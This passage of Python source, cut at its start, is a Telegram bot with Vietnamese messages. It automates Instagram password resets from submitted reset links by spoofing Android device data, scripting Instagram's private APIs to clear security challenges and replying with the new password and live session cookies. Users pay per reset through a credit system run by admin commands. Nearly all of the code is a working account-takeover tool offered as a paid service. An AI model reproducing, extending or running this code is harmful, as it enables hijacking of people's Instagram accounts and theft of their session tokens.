                print(f"[RETRY] Unknown challenge, retrying ({_retry+1}/{MAX_RETRIES})...")
                return reset_instagram_password(reset_link, device, _retry=_retry+1)
            return reset_instagram_password_v1(reset_link=reset_link, device=device)
        else:
            print(f"[FLOW] No meta redirect found in R2, falling back")
            if _retry < MAX_RETRIES:
                print(f"[RETRY] No redirect, retrying ({_retry+1}/{MAX_RETRIES})...")
                return reset_instagram_password(reset_link, device, _retry=_retry+1)
            return reset_instagram_password_v1(reset_link=reset_link, device=device)

    else:
        print("[failed 1] No OpenUrlV2 found")
        print(f"[FLOW] Response text (first 1000): {text[:1000]}")
        return reset_instagram_password_v1(reset_link=reset_link, device=device)
def verify_challenge_code(session, challenge_url, csrftoken, code, reset_link, device):
    """Submit verification code - try web POST first (for csrftoken cookie), mobile API as fallback"""
    try:
        USER_AGENT = device["user_agent"]
        
        # Convert mobile API URL to web URL
        # i.instagram.com/api/v1/challenge/action/xxx → www.instagram.com/challenge/action/xxx
        if "i.instagram.com/api/v1" in challenge_url:
            web_challenge_url = challenge_url.replace("https://i.instagram.com/api/v1", "https://www.instagram.com")
        else:
            web_challenge_url = challenge_url
        
        # Step 1: Try web POST (like browser SPA does)
        print(f"[CHALLENGE] Trying web POST first: {web_challenge_url[:100]}")
        web_headers = {
            "User-Agent": USER_AGENT,
            "X-CSRFToken": csrftoken or session.cookies.get("csrftoken", ""),
            "X-Requested-With": "XMLHttpRequest",
            "X-Instagram-AJAX": "1",
            "Referer": web_challenge_url,
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://www.instagram.com",
        }
        
        r_web = session.post(web_challenge_url, 
            headers=web_headers,
            data={"security_code": code},
            timeout=REQUEST_TIMEOUT)
        
        print(f"[CHALLENGE] Web POST status: {r_web.status_code}")
        print(f"[CHALLENGE] Web POST response (first 500): {r_web.text[:500]}")
        
        # Check if web POST gave us cookies
        web_cookies = session.cookies.get_dict()
        has_csrftoken = "csrftoken" in web_cookies
        has_sessionid = "sessionid" in web_cookies
        print(f"[CHALLENGE] Web cookies: csrftoken={has_csrftoken}, sessionid={has_sessionid}")
        
        if has_sessionid and has_csrftoken:
            print(f"[CHALLENGE] Web POST success! Got full cookies with csrftoken")
            all_cookies = web_cookies
            pre_cookies = "; ".join(f"{k}={v}" for k, v in all_cookies.items())
            
            print(f"[CHALLENGE] Now trying v1 to change password...")
            res = reset_instagram_password_v1(reset_link=reset_link, device=device)
            if res.get("success"):
                return {
                    "type": "success",
                    "password": res.get("password"),
                    "cookies": pre_cookies,
                }
            else:
                pw = device["password"].split(":")[-1]
                return {
                    "type": "success",
                    "password": pw,
                    "cookies": pre_cookies,
                    "note": f"⚠️ Challenge passed nhưng v1 fail.\n🍪 `{pre_cookies}`\n🔑 `{pw}`\nThử gửi lại link để đổi pass."
                }
        
        # Step 2: Web POST didn't give full cookies → fall back to mobile API
        print(f"[CHALLENGE] Web POST incomplete cookies, falling back to mobile API")
        mobile_headers = make_headers(user_agent=USER_AGENT)
        mobile_headers['X-CSRFToken'] = csrftoken
        
        print(f"[CHALLENGE] Mobile POST: {challenge_url[:100]}")
        
        r = session.post(challenge_url, 
            headers=mobile_headers,
            data={"security_code": code},
            timeout=REQUEST_TIMEOUT)
        
        print(f"[CHALLENGE] Response status: {r.status_code}")
        print(f"[CHALLENGE] Response (first 500): {r.text[:500]}")
        print(f"[CHALLENGE] Response headers: {dict(r.headers)}")
        
        # Check for session cookies from Set-Cookie headers
        header_str = str(r.headers)
        sessionid_match = re.search(r'sessionid=([^;]+)', header_str)
        ds_user_id_match = re.search(r'ds_user_id=([^;]+)', header_str)
        sessionid = sessionid_match.group(1) if sessionid_match else None
        ds_user_id = ds_user_id_match.group(1) if ds_user_id_match else None
        
        # Also check ig-set-authorization Bearer token (mobile API format)
        if not sessionid:
            auth_header = r.headers.get('ig-set-authorization', '')
            if auth_header.startswith('Bearer IGT:2:'):
                try:
                    import base64
                    token_b64 = auth_header.split('Bearer IGT:2:')[1]
                    token_json = base64.b64decode(token_b64).decode('utf-8')
                    import json
                    token_data = json.loads(token_json)
                    sessionid = token_data.get('sessionid', '')
                    ds_user_id = token_data.get('ds_user_id', '')
                    print(f"[CHALLENGE] Extracted from Bearer: sessionid={sessionid[:30]}..., ds_user_id={ds_user_id}")
                except Exception as e:
                    print(f"[CHALLENGE] Failed to parse Bearer token: {e}")
        
        # Also check ig-set-ig-u-ds-user-id header
        if not ds_user_id:
            ds_user_id = r.headers.get('ig-set-ig-u-ds-user-id', '')
        
        if sessionid and ds_user_id:
            # Use request_change_pass (web) like codeentry does — NOT v1 (mobile)
            pre_cookies = f"sessionid={sessionid}; ds_user_id={ds_user_id}"
            print(f"[CHALLENGE] Challenge cleared! Using request_change_pass (web) to change password...")
            return request_change_pass(session, reset_link, device=device, pre_cookies=pre_cookies)
        
        try:
            resp_json = r.json()
            step_name = resp_json.get("step_name", "")
            print(f"[CHALLENGE] step_name after code: {step_name}")
            
            if resp_json.get("status") == "ok" and "logged_in_user" in resp_json:
                print(f"[CHALLENGE] Login successful! Using request_change_pass (web)...")
                pre_cookies = f"sessionid={sessionid}; ds_user_id={ds_user_id}" if sessionid else ""
                return request_change_pass(session, reset_link, device=device, pre_cookies=pre_cookies)
            
            if step_name == "verify_email":
                # Code might be wrong
                return {
                    "type": "failed",
                    "error": "Code sai hoặc hết hạn. Thử lại."
                }
            
            # Challenge passed - try to change password via v1
            if resp_json.get("status") == "ok":
                print(f"[CHALLENGE] Challenge passed! Trying v1 password change...")
                res = reset_instagram_password_v1(reset_link=reset_link, device=device)
                if res.get("success"):
                    return {
                        "type": "success",
                        "password": res.get("password"),
                    }
                else:
                    pw = device["password"].split(":")[-1]
                    return {
                        "type": "success",
                        "password": pw,
                        "note": f"Challenge passed ✅\n🔑 `{pw}`\nPassword có thể đã đổi. Thử login để kiểm tra."
                    }
            
            return {
                "type": "failed",
                "error": f"Challenge response: {step_name or resp_json.get('status', 'unknown')}"
            }
            
        except ValueError:
            print(f"[CHALLENGE] Response is not JSON")
            
            # Check cookies from response
            all_cookies = str(session.cookies.get_dict())
            if "sessionid" in all_cookies:
                print(f"[CHALLENGE] Found sessionid in cookies!")
                pw = device["password"].split(":")[-1]
                return {
                    "type": "success", 
                    "password": pw,
                }
            
            return {
                "type": "failed",
                "error": "Không parse được response từ IG."
            }
    
    except Exception as e:
        import traceback
        traceback.print_exc()
        return {
            "type": "failed",
            "error": f"Error: {type(e).__name__}: {e}"
        }

def gen_ecrypt_pass_mobile(p):
    ts = int(datetime.now().timestamp())
    return f"#PWD_INSTAGRAM:0:{ts}:{p}"
def reset_instagram_password_v1(reset_link, device):
    try:
        pw = device["password"].split(":")[-1]
        epw = gen_ecrypt_pass_mobile(pw)
        uidb36 = reset_link.split("uidb36=")[1].split("&token=")[0]
        token = reset_link.split("&token=")[1].split(":")[0]
        session = build_http_session(user_agent=device["user_agent"])
        
        url = "https://i.instagram.com/api/v1/accounts/password_reset/"
        data = {
            "source": "one_click_login_email",
            "uidb36": uidb36,
            "device_id": device["android_id"],
            "token": token,
            "waterfall_id": device["waterfall_id"]
        }

        print(f"[V1] Step 1: POST password_reset, uidb36={uidb36}, token={token[:20]}...")
        r = session.post(url, headers=make_headers(user_agent=device["user_agent"]), data=data, timeout=REQUEST_TIMEOUT)
        print(f"[V1] Step 1 response status: {r.status_code}")
        print(f"[V1] Step 1 response text (first 500): {r.text[:500]}")
        
        if "user_id" not in r.text:
            return {"success": False, "error": "This link expired"}

        mid = r.headers.get("Ig-Set-X-Mid")
        resp_json = r.json()
        user_id = resp_json.get("user_id")
        cni = resp_json.get("cni")
        nonce_code = resp_json.get("nonce_code")
        challenge_context = resp_json.get("challenge_context")
        print(f"[V1] Step 1 parsed: user_id={user_id}, cni={cni}, nonce_code={nonce_code}")

        url2 = "https://i.instagram.com/api/v1/bloks/apps/com.instagram.challenge.navigation.take_challenge/"
        data2 = {
            "user_id": str(user_id),
            "cni": str(cni),
            "nonce_code": str(nonce_code),
            "bk_client_context": '{"bloks_version":"e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd","styles_id":"instagram"}',
            "challenge_context": str(challenge_context),
            "bloks_versioning_id": "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd",
            "get_challenge": "true"
        }
        print(f"[V1] Step 2: POST take_challenge...")
        r2 = session.post(url2, headers=make_headers(mid, device["user_agent"]), data=data2, timeout=REQUEST_TIMEOUT).text
        print(f"[V1] Step 2 response (first 500): {r2[:500]}")
        
        # Check if expected pattern exists before splitting
        search_pattern = f'(bk.action.i64.Const, {cni}), "'
        r2_clean = r2.replace('\\', '')
        if search_pattern not in r2_clean:
            print(f"[V1] Old pattern not found, checking if challenge was auto-cleared...")
            
            if '"status":"ok"' in r2_clean:
                # Note: UNKNOWN with cni=0 may still work, continuing
                if cni == 0 and '"UNKNOWN"' in r2_clean:
                    print(f"[V1] UNKNOWN challenge type with cni=0 - attempting anyway")
                print(f"[V1] Challenge auto-cleared (status:ok, cni={cni})")
                print(f"[V1] Using challenge_context from Step 1 directly")
                challenge_context_final = str(challenge_context)
            else:
                print(f"[V1] ERROR: Pattern not found and status not ok")
                print(f"[V1] Looking for: {search_pattern}")
                print(f"[V1] Full response: {r2_clean[:2000]}")
                return {
                    "success": False,
                    "error": f"IG response format changed - pattern not found"
                }
        else:
            challenge_context_final = r2_clean.split(f'(bk.action.i64.Const, {cni}), "')[1].split('", (bk.action.bool.Const, false)))')[0]
        print(f"[V1] Step 2 parsed challenge_context_final (first 100): {challenge_context_final[:100]}")

        data3 = {
            "is_caa": "False",
            "source": "",
            "uidb36": "",
            "error_state": {"type_name":"str","index":0,"state_id":1048583541},
            "afv": "",
            "cni": str(cni),
            "token": "",
            "has_follow_up_screens": "0",
            "bk_client_context": {"bloks_version":"e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd","styles_id":"instagram"},
            "challenge_context": challenge_context_final,
            "bloks_versioning_id": "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd",
            "enc_new_password1": epw,
            "enc_new_password2": epw
        }
        
        print(f"[V1] Step 3: POST change password...")
        r3 = session.post(url2, headers=make_headers(mid, device["user_agent"]), data=data3, timeout=REQUEST_TIMEOUT)
        print(f"[V1] Step 3 response status: {r3.status_code}")
        print(f"[V1] Step 3 response (first 500): {r3.text[:500]}")
        
        # Check if password was rejected (used before)
        r3_clean = r3.text.replace('\\', '')
        if "haven't used before" in r3_clean or "used before" in r3_clean or "password you" in r3_clean.lower():
            print(f"[V1] Password rejected - already used before. Generating new password...")
            import random, string
            for retry in range(3):
                new_pw = ''.join(random.choices(string.ascii_letters + string.digits, k=10)) + random.choice("!@#$%")
                new_epw = gen_ecrypt_pass_mobile(new_pw)
                data3["enc_new_password1"] = new_epw
                data3["enc_new_password2"] = new_epw
                print(f"[V1] Retry {retry+1}: Trying new password: {new_pw}")
                r3 = session.post(url2, headers=make_headers(mid, device["user_agent"]), data=data3, timeout=REQUEST_TIMEOUT)
                print(f"[V1] Retry {retry+1} response (first 300): {r3.text[:300]}")
                r3_clean = r3.text.replace('\\', '')
                if "haven't used before" not in r3_clean and "used before" not in r3_clean:
                    pw = new_pw  # Update password to the new one
                    break
        
        # Check if Step 3 already confirmed success
        r3_text = r3.text.replace('\\', '')
        if "ClearChallengeWithParams" in r3_text and "SECURITY_CHECKUP_PASSWORD_RESET" in r3_text:
            print(f"[V1] Step 3 confirmed success (ClearChallengeWithParams). Skipping Step 4.")
            return {
                "success": True,
                "password": pw,
            }
        
        # If UNKNOWN challenge type - password was NOT changed
        if "ClearChallengeWithParams" in r3_text and '"UNKNOWN"' in r3_text:
            print(f"[V1] Step 3: UNKNOWN challenge - password NOT changed")
            return {
                "success": False,
                "error": "UNKNOWN challenge — IG chặn đổi pass (V1 Step 3)."
            }
        
        print(f"[V1] Step 4: POST password_reset again to verify...")
        r = session.post(url, data=data, headers=make_headers(user_agent=device["user_agent"]), timeout=REQUEST_TIMEOUT)
        print(f"[V1] Step 4 response status: {r.status_code}")
        print(f"[V1] Step 4 response (first 500): {r.text[:500]}")
        
        if '"status":"fail"' not in r.text:
            return {
                "success": False,
                "error": "V1 Step 4: Token chưa consumed — pass chưa đổi."
            }

        return {
            "success": True,
            "password": pw,
            }
            
    except Exception as e:
        import traceback
        traceback.print_exc()
        print(f"[V1 ERROR] {type(e).__name__}: {e}")
        return {
            "success": False,
            "error": f"Try again ({type(e).__name__}: {e})"
            }
        

async def start_command(update, context):
    user_id_str = str(update.effective_user.id)

    # Admin luôn được vào
    if user_id_str in ADMINS:
        await update.message.reply_text(
            f"👑 Admin mode activated.\nYour id: `{user_id_str}`",
            parse_mode="Markdown"
        )
        await update.message.reply_text(
            "📋 Danh sách lệnh:\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "👥 Quản lý user:\n"
            "/adduser <user_id> — Thêm user\n"
            "/removeuser <user_id> — Xóa user\n"
            "/users — Xem danh sách user\n\n"
            "💰 Quản lý credit:\n"
            "/setcredit <user_id> <amount> — Set credit\n"
            "/addcredit <user_id> <amount> — Cộng thêm credit\n"
            "/removecredit <user_id> <amount> — Trừ bớt credit\n"
            "/transfer <from_id> <to_id> <amount> — Chuyển credit\n\n"
            "📢 Broadcast:\n"
            "/broadcast <message> — Gửi tin nhắn đến tất cả user"
        )
        return

    credits = get_user_credits(user_id_str)
    if credits is None:
        await update.message.reply_text(f"⛔ You are not authorized.\nYour id: `{user_id_str}`", parse_mode="Markdown")
        return


    await update.message.reply_text(
        f"👋 Welcome!\nYou have {credits} credits left.\nYour id: `{user_id_str}`", parse_mode="Markdown"
    )
def build_session_from_saved(data):
    session = requests.Session()

    # restore cookies
    cookies = data.get("cookies", {})
    session.cookies.update(cookies)

    # restore headers
    headers = data.get("headers", {})
    session.headers.update(headers)

    return session
async def process_reset(update, context, user_id_str, reset_link):
    try:
        loop = asyncio.get_running_loop()

        async with GLOBAL_LIMIT:
            result = await loop.run_in_executor(
                EXECUTOR,
                reset_instagram_password,
                reset_link,
                context.user_data["device"]
            )

        if result.get("need_code"):
            context.user_data["state"] = "waiting_code"
            context.user_data["ig_data"] = result.get("data")

            await update.message.reply_text("📩 Enter code (6 digits):")
            return

        if result.get("success"):
            credits_left = consume_credit(user_id_str)
            if result.get("note"):
                m = result.get("note")
                m += f"\nCredits left: {credits_left}"
                await update.message.reply_text(m, parse_mode="Markdown")
            elif result.get("note_2fa"):
                m = f"✅ RESET OK\n{result.get('note_2fa')}\nCredits left: {credits_left}"
                await update.message.reply_text(m, parse_mode="Markdown")
            else:
                c = result.get("cookies")
                p = result.get("password")
                s = f"✅ RESET OK\n🍪 `{c}`\n🔑 `{p}`\nCredits left: {credits_left}"
                await update.message.reply_text(
                    s,
                    parse_mode="Markdown"
                )
            return

        await update.message.reply_text(
            f"❌ RESET FAIL\nReason: {result.get('error')}\nCredits left: {get_user_credits(user_id_str)}", parse_mode="Markdown"
        )
    except Exception as e:
        import traceback
        traceback.print_exc()
        print(f"[process_reset ERROR] {type(e).__name__}: {e}")
        await update.message.reply_text(f"ERROR: {type(e).__name__}: {e}")


async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id_str = str(update.effective_user.id)
        text = update.message.text.strip()

        print("Message:", text)
        print("User ID:", user_id_str)

        code_format = re.match(r"^\d{6}$", text)

        if context.user_data.get("state") == "waiting_code":
            if not code_format:
                await update.message.reply_text("Tao phien moi...")
                context.user_data.clear()
                return

            code = text
            ig_data = context.user_data.get("ig_data")
            await update.message.reply_text("Verifying code...")

            loop = asyncio.get_running_loop()
            async with GLOBAL_LIMIT:
                # Check if this is a mobile challenge flow
                if ig_data.get("challenge_url"):
                    result = await loop.run_in_executor(
                        EXECUTOR,
                        verify_challenge_code,
                        ig_data["session"],
                        ig_data["challenge_url"],
                        ig_data["csrftoken"],
                        code,
                        ig_data["reset_link"],
                        context.user_data["device"]
                    )
                else:
                    result = await loop.run_in_executor(
                        EXECUTOR,
                        verify_code,
                        ig_data["session"],
                        ig_data["context_data"],
                        ig_data["device_id"],
                        ig_data["referer"],
                        ig_data["lsd"],
                        ig_data["jazoest"],
                        code,
                        ig_data["reset_link"],
                        context.user_data["device"]
                    )

            if result is not None:
                if result.get("type") == "success":
                    credits_left = consume_credit(user_id_str)
                    if result.get("note"):
                        message = f"{result.get('note')}\nCredits left: {credits_left}"
                    else:
                        pw = result.get("password")
                        cookies = result.get("cookies")
                        if pw is not None:
                            message = f"Success ✅\nPassword: `{pw}`\nCookies: `{cookies}`"
                        else:
                            message = (
                                f"Cookies: `{cookies}`\n\n"
                                "Login bang cookies truoc, sau do gui link reset moi de lay password.\n"
                            )
                        message += f"\nCredits left: {credits_left}"
                    await update.message.reply_text(message, parse_mode="Markdown")
                elif result.get("type") == "failed":
                    ms = result.get("error")
                    await update.message.reply_text(
                        f"Failed: {ms}\nCredits left: {get_user_credits(user_id_str)}",
                        parse_mode="Markdown"
                    )
                else:
                    await update.message.reply_text(result.get("type"), parse_mode="Markdown")

            context.user_data.clear()
            return

        credits = get_user_credits(user_id_str)
        if credits is None:
            await update.message.reply_text("Unauthorized.")
            return

        if credits <= 0:
            await update.message.reply_text("No credits left.")
            return

        reset_link = text
        track_usage(user_id_str)
        android_id, user_agent, waterfall_id, password = generate_device_info()

        context.user_data["device"] = {
            "android_id": android_id,
            "user_agent": user_agent,
            "waterfall_id": waterfall_id,
            "password": password
        }
        await update.message.reply_text("Processing...")

        async def run_reset():
            await process_reset(update, context, user_id_str, reset_link)

        context.application.create_task(run_reset())
    except Exception as e:
        print("CRASH:", e)

async def broadcast_command(update, context):
    admin_id_str = str(update.effective_user.id)
    if admin_id_str not in ADMINS:
        await update.message.reply_text("⛔ Admin only.")
        return

    msg = " ".join(context.args)
    if not msg:
        await update.message.reply_text("Usage: /broadcast <message>")
        return

    sent = 0
    failed = 0
    with USER_DATA_LOCK:
        user_ids = list(USER_DATA.keys())
    for user_id in user_ids:
        try:
            await context.bot.send_message(chat_id=int(user_id), text=f"📢 {msg}")
            sent += 1
        except Exception:
            failed += 1

    await update.message.reply_text(f"📢 Broadcast done!\n✅ Sent: {sent}\n❌ Failed: {failed}")

async def stats_command(update, context):
    admin_id_str = str(update.effective_user.id)
    if admin_id_str not in ADMINS:
        await update.message.reply_text("⛔ Admin only.")
        return

    from datetime import datetime, timezone, timedelta
    vn_tz = timezone(timedelta(hours=7))
    today = datetime.now(vn_tz).strftime("%Y-%m-%d")
    lines = ["📊 Usage Stats\n━━━━━━━━━━━━━━━━━━━━"]
    total_all = 0
    total_today = 0

    with USER_DATA_LOCK:
        all_users = list(USER_DATA.keys())

    with STATS_LOCK:
        for uid in all_users:
            s = USAGE_STATS.get(uid, {"total": 0, "daily": {}})
            t = s.get("total", 0)
            d = s.get("daily", {}).get(today, 0)
            if d == 0:
                continue
            credits = get_user_credits(uid) or 0
            total_all += t
            total_today += d
            lines.append(f"👤 `{uid}` | 💰{credits}cr | 📈{t} total | 📅{d} today")

    lines.append(f"\n━━━━━━━━━━━━━━━━━━━━")
    lines.append(f"👥 Users: {len(all_users)} | 📈 Total: {total_all} | 📅 Today: {total_today}")

    msg = "\n".join(lines)
    if len(msg) > 4000:
        for i in range(0, len(msg), 4000):
            await update.message.reply_text(msg[i:i+4000], parse_mode="Markdown")
    else:
        await update.message.reply_text(msg, parse_mode="Markdown")

def main():
    app = ApplicationBuilder().token(BOT_TOKEN).concurrent_updates(512).build()
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("adduser", add_user))
    app.add_handler(CommandHandler("removeuser", remove_user))
    app.add_handler(CommandHandler("users", list_users))
    app.add_handler(CommandHandler("setcredit", set_credit))
    app.add_handler(CommandHandler("addcredit", add_credit))
    app.add_handler(CommandHandler("removecredit", remove_credit))
    app.add_handler(CommandHandler("transfer", transfer_credit))
    app.add_handler(CommandHandler("broadcast", broadcast_command))
    app.add_handler(CommandHandler("stats", stats_command))
    # Document trước
    # app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    # Text cuối và loại trừ command
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    print("Bot running...")
    app.run_polling()

if __name__ == "__main__":
    try:
        test_proxy()
        main()
    except Exception as e:
        print("CRASH:", e)
